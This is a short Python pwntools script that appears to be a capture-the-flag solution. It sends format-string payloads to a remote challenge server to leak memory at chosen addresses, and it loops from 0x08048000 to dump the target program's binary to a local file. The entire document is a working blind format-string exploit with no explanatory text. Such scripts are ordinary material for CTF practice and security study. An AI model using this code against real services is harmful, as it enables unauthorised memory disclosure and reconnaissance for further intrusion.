from pwn import *
context.log_level = 'debug'



def leak(addr):
	cn = remote('challenges.xctf.org.cn', 14004)
	pay = '%14$saaa'+p32(addr)
	cn.sendline(pay)
	data = cn.recvuntil('aaa')[:-3]+'\x00'
	print data.encode('hex')
	cn.close()
	return data

p=0x08048000
d=''
while 1:
	l = leak(p)
	d += l
	p +=len(l)
	open('dump','wb').write(d)